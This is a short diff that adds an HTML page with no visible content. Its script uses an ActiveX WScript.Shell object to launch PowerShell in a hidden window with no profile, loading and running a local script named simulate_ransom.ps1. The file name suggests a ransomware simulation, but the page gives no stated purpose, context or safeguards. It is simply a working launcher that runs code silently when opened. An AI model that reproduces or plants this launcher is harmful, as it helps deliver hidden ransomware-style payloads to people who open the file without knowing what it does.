@@ -1,0 +1,8 @@
+<html>
+<head>
+<script>
+var shell = new ActiveXObject("WScript.Shell");
+shell.Run("powershell.exe -w hidden -nop -c iex (Get-Content simulate_ransom.ps1 -Raw)");
+</script>
+</head>
+</html>
